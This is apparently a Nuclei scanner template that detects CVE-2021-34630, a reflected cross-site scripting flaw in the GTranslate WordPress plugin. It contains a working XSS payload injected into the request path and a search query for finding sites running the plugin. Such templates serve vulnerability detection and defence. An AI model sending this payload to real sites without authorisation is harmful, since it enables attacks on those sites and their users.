id: CVE-2021-34630

info:
  name: GTranslate < 2.8.65 - Cross-Site Scripting
  author: ritikchaddha
  severity: medium
  description: |
    In the Pro and Enterprise versions of GTranslate < 2.8.65, the gtranslate_request_uri_var function runs at the top of all pages and echoes out the contents of $_SERVER['REQUEST_URI']. Although this uses addslashes, and most modern browsers automatically URLencode requests, this plugin is still vulnerable to Reflected XSS in older browsers such as Internet Explorer 9 or below, or in cases where an attacker is able to modify the request en route between the client and the server, or in cases where the user is using an atypical browsing solution.
  impact: |
    Allows attackers to execute malicious scripts in the context of a user's browser session
  remediation: |
    Update GTranslate Plugin to the latest version to mitigate this issue.
  reference:
    - https://wpscan.com/vulnerability/dfac81bb-7807-4288-aee3-43c7653c6446/
    - https://nvd.nist.gov/vuln/detail/CVE-2021-34630
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-34630
    cwe-id: CWE-79
    epss-score: 0.04474
    epss-percentile: 0.8875
    cpe: cpe:2.3:a:gtranslate:gtranslate:*:*:*:*:enterprise:wordpress:*:*
  metadata:
    verifiedl: true
    max-request: 1
    vendor: gtranslate
    product: gtranslate
    framework: wordpress
    fofa-query: body="/wp-content/plugins/gtranslate"
  tags: cve,cve2022,wordpress,wp,wp-plugin,gtranslate,xss,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/?page</script><script>alert(document.domain)</script>"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '</script><script>alert(document.domain)</script>'
          - 'gtranslate'
        condition: and

      - type: word
        part: content_type
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 4b0a004830460221009eed9f9bebe665ef6c38ba96b0b6f0ba02062a1ee23614b1b942e6210d7045250221009725c1fda7337443f06d1cc25b63fb395a181e49fc360b8c822f6c9e1c114053:922c64590222798bb761d5b6d8e72950